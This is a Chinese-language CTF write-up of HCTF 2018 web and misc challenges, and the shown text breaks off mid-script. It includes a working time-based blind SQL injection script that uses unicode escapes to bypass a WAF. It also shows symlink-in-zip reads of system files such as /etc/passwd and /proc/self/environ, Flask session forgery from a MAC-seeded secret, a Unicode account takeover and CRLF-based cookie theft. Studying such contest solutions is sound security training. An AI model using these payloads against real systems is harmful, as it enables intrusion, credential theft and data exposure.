（一开始没构造出来，然后就转思路去bypass waf了
参考这篇文章  
虽然他没绕过关键词检测，但是顺着他的思路尝试构造了  
\u0075nion，本地测试发现json_decode后变为union，成功bypass waf  
构造一个sleep的cookie，放到服务端测试也sleep了，证明此处注入可行
    Cookie:PHPSESSID=t0k91etf5fecbi4t25d7hprtm3;islogin=1;login_data={"admin_user":"admin111'/**/\u0075nion/**/select/**/1,2,3,4,5,6/**/from/**/fish_admin/**/where/**/\u0073leep(3)\u003d'1","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"}
后面就把所有关键词用这种方法绕过，就能直接注入了，最后flag在 F1444g表的F1a9字段  
附上注入脚本
    #!/usr/bin/python
    #!coding:utf-8#
    # xishir
    import requests
    import time
    import datetime
    #hctf{4526a8cbd741b3f790f95ad32c2514b9}
    ss = "{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"
    r = requests.session()
    url = "http://kzone.2018.hctf.io/admin/"
    #url="http://127.0.0.1/hctf/www/admin/"
    union = '\u00'+str(hex(ord('u')))[2:]+'nion'
    sleep = '\u00'+str(hex(ord('s')))[2:]+'leep'
    ascii = '\u00'+str(hex(ord('a')))[2:]+'scii'
    ok = '\u00'+str(hex(ord('=')))[2:]
    substr = '\u00'+str(hex(ord('s')))[2:]+'ubstr'
    over = '\u00'+str(hex(ord('#')))[2:]
    blank = "/**/"
    orr = '\u00'+str(hex(ord('o')))[2:]+'r'
    flag=""
    for i in range(1,50):
        print i
        for j in ss:
            payload = "admin' and (substr((select binary F1a9 from F1444g limit 1),"+str(i)+",1)='"+str(j)+"') and sleep(4) and 1='1"
            payload = payload.replace('sleep',sleep)
            payload = payload.replace('union',union)
            payload = payload.replace('=',ok)
            payload = payload.replace('#',over)
            payload = payload.replace(' ',blank)
            payload = payload.replace('ascii',ascii)
            payload = payload.replace('substr',substr)
            payload = payload.replace('or',orr)
            jsons = '{"admin_user":"'+payload+'","admin_pass":"3b30a11aaba222edd6e704e9959b94643ed4ffd9"}'
            cookie={"PHPSESSID":"t0k91etf5fecbi4t25d7hprtm3",
            "islogin":"1",
            "login_data":jsons}
            t1=time.time()
            r1 = r.get("http://kzone.2018.hctf.io",cookies=cookie)
            t2=time.time()
            #print t2
            if (t2-t1)>4:
                #print "aaaaaaaa"
                flag+=str(j)
                print i,flag
                break
## admin
找到源码 
有个进程每30秒重置一次数据库
看到strlower函数很奇怪  
参考：  
最后解题步骤如下  
注册一个ᴬdmin账号  
登陆ᴬdmin，发现页面显示Admin  
修改密码，退出登录  
重新登陆Admin，看到flag  
## hide and seek
传个zip，会解压缩并且读取  
尝试传个链接文件ln -s /etc/passwd test 并压缩上传  
读到/etc/passwd
然后就是各种文件读取  
在 /proc/self/environ读取到一个好东西
    UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=323a960bcc1aSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0
然后直接读/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini文件得到
    [uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app
按部就班读取项目文件
/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py  
得到
    # -*- coding: utf-8 -*-    from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
    import uuid
    import base64
    import random
    import flag
    from werkzeug.utils import secure_filename
    import os
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
    app.config['UPLOAD_FOLDER'] = './uploads'
    app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
    ALLOWED_EXTENSIONS = set(['zip'])
    def allowed_file(filename):
        return '.' in filename and \
               filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    @app.route('/', methods=['GET'])
    def index():
        error = request.args.get('error', '')
        if(error == '1'):
            session.pop('username', None)
            return render_template('index.html', forbidden=1)
        if 'username' in session:
            return render_template('index.html', user=session['username'], flag=flag.flag)
        else:
            return render_template('index.html')
    @app.route('/login', methods=['POST'])
    def login():
        username=request.form['username']
        password=request.form['password']
        if request.method == 'POST' and username != '' and password != '':
            if(username == 'admin'):
                return redirect(url_for('index',error=1))
            session['username'] = username
        return redirect(url_for('index'))
    @app.route('/logout', methods=['GET'])
    def logout():
        session.pop('username', None)
        return redirect(url_for('index'))
    @app.route('/upload', methods=['POST'])
    def upload_file():
        if 'the_file' not in request.files:
            return redirect(url_for('index'))
        file = request.files['the_file']
        if file.filename == '':
            return redirect(url_for('index'))
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            if(os.path.exists(file_save_path)):
                return 'This file already exists'
            file.save(file_save_path)
        else:
            return 'This file is not a zipfile'
    try:
            extract_path = file_save_path + '_'
            os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
            read_obj = os.popen('cat ' + extract_path + '/*')
            file = read_obj.read()
            read_obj.close()
            os.system('rm -rf ' + extract_path)
        except Exception as e:
            file = None
        os.remove(file_save_path)
        if(file != None):
            if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
        return Response(file)
    if __name__ == '__main__':
        #app.run(debug=True)
        app.run(host='127.0.0.1', debug=True, port=10008)
因为有这段
    if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
                return redirect(url_for('index', error=1))
如果文件里有hctf就返回主页  
所以不能直接读flag.py，也没有flag.pyc  
后面读index.html发现admin用户登录就能看到flag
    {% if user == 'admin' %}
            Your flag: 
            {{ flag  }}
想到要读secret，伪造admin的session，发现代码里的secret是伪随机的
    random.seed(uuid.getnode())
    app = Flask(__name__)
    app.config['SECRET_KEY'] = str(random.random()*100)
随机数种子固定为mac地址，读取 /sys/class/net/eth0/address 可以得到  
然后带入seed，本地跑一下，登陆admin拿到cookie，再放到网站上就能看到flag了  
## Game
赛后解出：  
这样可以按照密码进行排序  
不断注册新用户，密码逐位逐位与admin的密码比较，最后得到admin的密码，比如注册个密码为d的用户
然后按密码排序，发现它在admin下面
然后注册一个密码为e的用户，发现他在admin上面
由此可以推算出admin密码第一位是d，按照此原理，逐位得到完整的admin密码为dsa8&&!@#$%^&d1ngy1as3dja，登录访问flag.php即可getflag。
## bottle
直接参考p总链接即可:  
首先发现CLRF
刚开始的时候，CSP是在响应包的上面的，需要想办法绕过CSP。  
第二天CSP被设置到响应包下面了。  
接下来就简单了，只需要绕过302跳转就可以打到cookie。因为302的时候不会xss。利用
改cookie登陆
# Misc
## easy dump
用volatility看了一下，发现有mspaint进程，把内存dump下来  
把mspaint.exe dump下来的内存改名为.data后缀，用gimp打开，调整位移 宽度 高度
> flag:hctf{big_brother_is_watching_you}
## freq game
FFT different frequency sin  
MATLAB: y = importdata(""); 加载样本点  
Y = fft(y);  
plot(abs(Y));
根据图片查看频率值，对称的四个正弦函数的频率，最高点对应的横坐标减1就是频率  
交互8次，即可得到flag
## difficult programming language
解压后发现一个pcap包，Wireshark打开发现是USB流量包，简单浏览后发现每帧都有8字节，且仅第一字节和第三字节有数据，猜测是键盘的流量，于是本地自己抓键盘的包试了下：  
第一个字节  
0x01 ctrl  
0x02 shift  
第三个字节是按键的键值就不列出了，后面找了下相关资料验证了这个猜想，于是tshark先把每帧的Leftover Capture
Data提取出来，然后写个脚本把键值转成字符串，得到一个混杂字母和符号的字符串，根据题目所给“difficult programming
language”猜测可能是malbolge语言，找个解释器把解出的字符串丢进去跑一下就得到flag。
代码：
    usb_data = open('usbdata.txt')
    str_decode = ''
    for i in range(422):
        buffer = usb_data.readline()
        cmd = int(buffer[6] + buffer[7], 16)
        if cmd != 0:
            if buffer[1] == '0':
                if 4 <= cmd <= 29:
                    str_decode += chr(ord('a') + cmd - 4)
                elif 30 <= cmd <= 38:
                    str_decode += chr(ord('1') + cmd - 30)
                elif cmd == 39:
                    str_decode += '0'
                elif cmd == 45:
                    str_decode += '-'
                elif cmd == 46:
                    str_decode += '='
                elif cmd == 47: